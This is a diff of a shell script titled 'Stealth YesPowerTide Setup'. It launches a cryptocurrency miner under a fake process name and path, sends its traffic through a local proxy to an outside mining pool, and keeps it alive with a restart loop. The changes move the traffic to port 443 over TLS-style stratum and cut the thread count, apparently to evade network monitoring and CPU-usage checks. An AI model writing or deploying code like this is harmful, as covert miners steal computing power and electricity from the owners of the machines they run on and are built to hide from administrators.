@@ -11,14 +11,14 @@ echo "🔒 Starting Stealth YesPowerTide Setup..."
 # ======================
 cat <<EOL > .env
 REMOTE_HOST=asia.rplant.xyz
-REMOTE_PORT=7059
+REMOTE_PORT=17059
 REMOTE_PASSWORD=x
 LOCAL_HOST=0.0.0.0
-LOCAL_PORT=8080
+LOCAL_PORT=443
 EOL
 
 npm start > proxy.log 2>&1 &
-echo "✅ Proxy started on 127.0.0.1:8080"
+echo "✅ Proxy started on 127.0.0.1:443"
 
 sleep 8
 
@@ -36,10 +36,10 @@ echo "Launching as ${FAKE_NAME}..."
 
 "$FAKE_PATH" \
   -a yespowertide \
-  -o stratum+tcp://127.0.0.1:8080 \
+  -o stratum+tcps://127.0.0.1:443 \
   -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
   -p x \
-  -t $(nproc --all) \
+  -t 2 \
   --cpu-affinity \
   -B --no-color > /dev/null 2>&1 &
 
@@ -50,6 +50,6 @@ while true; do
     sleep 30
     if ! pgrep -f yespowertide > /dev/null 2>&1 && ! pgrep -f miner > /dev/null 2>&1; then
         echo "Miner died, restarting..."
-        "$FAKE_PATH" -a yespowertide -o stratum+tcp://127.0.0.1:8080 -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H -p x -t $(nproc --all) -B > /dev/null 2>&1 &
+        "$FAKE_PATH" -a yespowertide -o stratum+tcp://127.0.0.1:443 -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H -p x -t $(nproc --all) -B > /dev/null 2>&1 &
     fi
 done
